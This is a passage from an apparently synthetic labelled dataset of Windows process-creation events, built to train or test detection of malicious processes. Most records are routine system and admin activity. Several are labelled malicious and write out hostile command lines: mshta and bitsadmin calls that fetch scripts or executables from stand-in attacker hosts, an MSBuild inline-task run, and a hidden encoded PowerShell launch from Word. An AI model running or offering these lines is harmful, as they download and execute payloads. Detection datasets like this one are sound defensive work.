  {
    "UtcTime": "2024-07-03T08:14:52.032Z",
    "ProcessGuid": "{EB2ABC02-9628-4C35-B35A-7E137AF25EDC}",
    "ProcessId": 53759,
    "Image": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe C:\\Users\\dbadmin\\Documents",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 21673,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T15:54:44.701Z",
    "ProcessGuid": "{059B40EB-D053-4DCC-92AD-CC7176804122}",
    "ProcessId": 7436,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Temp\\update_6.4.39.msi /passive /norestart",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 64733,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T08:02:54.883Z",
    "ProcessGuid": "{2968B7FE-DD86-4625-B25A-AF53E1E4465C}",
    "ProcessId": 1805,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 17026,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:34:39.156Z",
    "ProcessGuid": "{980E3AC0-9C3B-4AFF-9C76-362D331DA58B}",
    "ProcessId": 19184,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Import-Module ActiveDirectory; Get-ADComputer -Filter *\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 6478,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T14:16:54.122Z",
    "ProcessGuid": "{367A1568-1AFB-49D6-A1A0-790B294DB711}",
    "ProcessId": 6925,
    "Image": "C:\\Windows\\System32\\UsoClient.exe",
    "CommandLine": "UsoClient.exe StartInteractiveScan",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 11329,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:40:27.849Z",
    "ProcessGuid": "{8FF49661-ACC9-4403-AEC8-3C2406A1E5EC}",
    "ProcessId": 19132,
    "Image": "C:\\Program Files\\Slack\\Slack.exe",
    "CommandLine": "Slack.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 3889,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T15:08:11.204Z",
    "ProcessGuid": "{A9257184-3A2E-42FD-8B9C-E8290C815209}",
    "ProcessId": 11244,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "CommandLine": "rundll32.exe user32.dll,LockWorkStation",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 40698,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T10:43:38.053Z",
    "ProcessGuid": "{BECB14DE-350F-4B82-A609-A7D2E44262C6}",
    "ProcessId": 52722,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 42345,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-06T03:20:53.987Z",
    "ProcessGuid": "{FA445198-2B84-45C7-9E16-237F7E2C5AEA}",
    "ProcessId": 52976,
    "Image": "C:\\Windows\\System32\\mshta.exe",
    "CommandLine": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"http://dropper-srv1752.net/script510.hta\"\"\")",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 14974,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.005",
    "technique_name": "Mshta Remote HTA",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T20:43:38.241Z",
    "ProcessGuid": "{A8875755-7DFD-438D-9B5E-965A226F737D}",
    "ProcessId": 27598,
    "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe",
    "CommandLine": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe C:\\Users\\Public\\svc650.csproj",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 16629,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1127.001",
    "technique_name": "MSBuild Inline Task",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T17:03:53.396Z",
    "ProcessGuid": "{7EC44081-5940-470E-BE84-505128450BE8}",
    "ProcessId": 54635,
    "Image": "C:\\Windows\\SoftwareDistribution\\Download\\Install\\update.exe",
    "CommandLine": "update.exe /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 35247,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:11:05.764Z",
    "ProcessGuid": "{7929A884-AC5C-448E-9707-AB62600550F6}",
    "ProcessId": 65368,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\Backup-SharePointSites.ps1 -SiteUrl https://corp.sharepoint.com -OutputPath D:\\Backups",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 40587,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-05T06:35:39.753Z",
    "ProcessGuid": "{71AF4081-6E0C-4DEB-BF6D-5657DA52C9B5}",
    "ProcessId": 35357,
    "Image": "C:\\Windows\\System32\\fontdrvhost.exe",
    "CommandLine": "fontdrvhost.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 17137,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T13:22:44.464Z",
    "ProcessGuid": "{A730B588-CD5B-48F1-A797-798C1CF6C0D2}",
    "ProcessId": 18754,
    "Image": "C:\\Program Files\\Slack\\Slack.exe",
    "CommandLine": "Slack.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 21094,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T18:15:45.147Z",
    "ProcessGuid": "{849A242A-9691-471A-8599-8920C12F4714}",
    "ProcessId": 20088,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 29130,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T16:26:37.760Z",
    "ProcessGuid": "{9331971D-ABAA-48FE-807F-232667F7177E}",
    "ProcessId": 48618,
    "Image": "C:\\Program Files\\Slack\\Slack.exe",
    "CommandLine": "Slack.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 11126,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T17:05:05.749Z",
    "ProcessGuid": "{755117B7-C1C0-4160-983A-855A5C56546B}",
    "ProcessId": 32849,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 54478,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T17:38:56.329Z",
    "ProcessGuid": "{16D797F6-E895-40C9-8104-DA509C8A3B8D}",
    "ProcessId": 34037,
    "Image": "C:\\Users\\itops\\Downloads\\setup.exe",
    "CommandLine": "setup.exe /S /v/qn",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 58762,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T13:39:48.510Z",
    "ProcessGuid": "{FD82702B-5E61-4DE7-881D-C29F544BDF52}",
    "ProcessId": 41986,
    "Image": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "CommandLine": "Code.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 29969,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T09:18:29.447Z",
    "ProcessGuid": "{1B4436BC-218A-41AE-BEF7-FF34C1F70468}",
    "ProcessId": 6189,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -verifystore My server3",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 60454,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-02T01:18:58.849Z",
    "ProcessGuid": "{2CFC0579-7581-4EDE-87AE-B4F395A72D8E}",
    "ProcessId": 31962,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 46617,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T17:04:02.433Z",
    "ProcessGuid": "{B62021FF-7DAA-44AF-8390-A103A767B394}",
    "ProcessId": 23579,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ipconfig /all",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 46900,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T11:37:58.701Z",
    "ProcessGuid": "{EB0E0EAF-FFDF-45D5-B148-C58489FFA1E8}",
    "ProcessId": 23226,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i http://fileserver.corp.local/package29.msi /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 61406,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T03:35:29.727Z",
    "ProcessGuid": "{448B33CD-49BD-47DE-9845-F04037B789E7}",
    "ProcessId": 38218,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -exec bypass -noni -nop -w hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "WINWORD.EXE /n",
    "ParentProcessId": 50495,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.001",
    "technique_name": "PowerShell Encoded Command",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T13:32:12.501Z",
    "ProcessGuid": "{784C093B-DBCC-4635-96AD-BDB0A175B379}",
    "ProcessId": 30192,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -verify -urlfetch C:\\Certs\\server10.cer",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 59026,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T13:02:17.504Z",
    "ProcessGuid": "{1F076443-A78A-454A-8B4C-967D2C813EDA}",
    "ProcessId": 60277,
    "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
    "CommandLine": "wmic.exe os get caption,version,buildnumber",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 47140,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-02T10:45:47.661Z",
    "ProcessGuid": "{4F078F05-A83E-4569-9897-77AEA703C945}",
    "ProcessId": 26540,
    "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "CommandLine": "firefox.exe -contentproc -childID 7",
    "ParentImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"",
    "ParentProcessId": 55291,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T07:14:16.830Z",
    "ProcessGuid": "{C107CC72-5039-4F2C-B776-132BFCC779F0}",
    "ProcessId": 20680,
    "Image": "C:\\Windows\\System32\\wininit.exe",
    "CommandLine": "wininit.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 7023,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T15:13:12.847Z",
    "ProcessGuid": "{A49BB53B-B370-4604-ADDD-938512C9118D}",
    "ProcessId": 36296,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net localgroup administrators",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 18768,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:14:13.876Z",
    "ProcessGuid": "{C9F05CAA-625F-417A-BEE1-7C7C86027C7F}",
    "ProcessId": 21637,
    "Image": "C:\\Windows\\System32\\wininit.exe",
    "CommandLine": "wininit.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 2422,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T11:50:45.059Z",
    "ProcessGuid": "{D97093AE-987C-42B9-BFC4-E5F0921BBE7B}",
    "ProcessId": 54978,
    "Image": "C:\\Windows\\System32\\conhost.exe",
    "CommandLine": "conhost.exe 0xffffffff -ForceV1",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 41431,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T09:09:27.667Z",
    "ProcessGuid": "{4F257380-6D1C-4EE3-8F74-394CC6477677}",
    "ProcessId": 39362,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe https://sharepoint.corp.local/sites/team",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentProcessId": 17622,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T19:15:36.558Z",
    "ProcessGuid": "{D56F88CF-0725-4155-9F63-DF1F8ED073C9}",
    "ProcessId": 15019,
    "Image": "C:\\Windows\\System32\\fontdrvhost.exe",
    "CommandLine": "fontdrvhost.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 25580,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T20:51:34.813Z",
    "ProcessGuid": "{B81E9C7D-6928-490B-90B6-1EFDAB60A749}",
    "ProcessId": 2279,
    "Image": "C:\\Windows\\SoftwareDistribution\\Download\\Install\\update.exe",
    "CommandLine": "update.exe /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 26067,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:25:24.386Z",
    "ProcessGuid": "{9631DBE3-5BE4-4616-BEFA-A3D9289161A7}",
    "ProcessId": 37221,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ping google.com",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 32195,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T08:05:59.771Z",
    "ProcessGuid": "{66DA4D6F-A99F-46BE-8B70-73C277BDF0E1}",
    "ProcessId": 56620,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 16491,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T20:18:10.448Z",
    "ProcessGuid": "{7A519B6C-385C-42F0-AE3C-2779DB0D084F}",
    "ProcessId": 55640,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 36600,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T11:40:14.053Z",
    "ProcessGuid": "{349CE688-B4A7-4E8E-8B82-A0C12630CC63}",
    "ProcessId": 7566,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c whoami",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 28086,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:08:36.872Z",
    "ProcessGuid": "{0BF48F7A-A3D7-41D9-97E0-8B8C261D81AC}",
    "ProcessId": 32807,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Restart-Service -Name Spooler -Force\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 52662,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T01:06:59.219Z",
    "ProcessGuid": "{FEF77EFE-22F9-4909-8329-DED44479337E}",
    "ProcessId": 61324,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer job9572 /download /priority high http://loader-cdn3972.net/svc840.exe C:\\Users\\Public\\update542.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 34042,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1197",
    "technique_name": "BITSAdmin Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T12:23:26.266Z",
    "ProcessGuid": "{B37D0251-34B5-4F75-B052-2020106F9D73}",
    "ProcessId": 11205,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --type=renderer --field-trial-handle=12345",
    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
    "ParentProcessId": 20894,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T16:41:38.623Z",
    "ProcessGuid": "{504D7347-0B09-450B-9B51-78124D95C8EA}",
    "ProcessId": 19525,
    "Image": "C:\\Users\\itops\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 20560,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T11:03:03.288Z",
    "ProcessGuid": "{790EC13D-3ABE-4BE8-9FEA-7DA34FCCAB8B}",
    "ProcessId": 33433,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k DcomLaunch -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 40158,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:46:35.297Z",
    "ProcessGuid": "{F6D0DC49-5C10-4BA2-8C89-C4460BBB6E05}",
    "ProcessId": 3425,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i http://deploy.corp.local/package32.msi /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 32948,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T16:16:35.881Z",
    "ProcessGuid": "{C33085C4-45EE-4B19-825C-B36838A2D924}",
    "ProcessId": 62763,
    "Image": "C:\\Windows\\System32\\calc.exe",
    "CommandLine": "calc.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 1752,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T23:03:18.614Z",
    "ProcessGuid": "{066073A2-9880-4C15-B13A-43CC89BF16C6}",
    "ProcessId": 21476,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 24045,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T20:26:44.826Z",
    "ProcessGuid": "{0F29A547-D658-458D-8815-314DE1AD1E24}",
    "ProcessId": 52920,
    "Image": "C:\\Windows\\System32\\mshta.exe",
    "CommandLine": "mshta.exe http://loader-cdn6172.org/payloads/script17.hta",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 51630,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.005",
    "technique_name": "Mshta Remote HTA",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T17:34:36.178Z",
    "ProcessGuid": "{8B2AEF9A-AC4E-4ED2-AD8B-45D88D1A4593}",
    "ProcessId": 25684,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe diskmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 43839,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
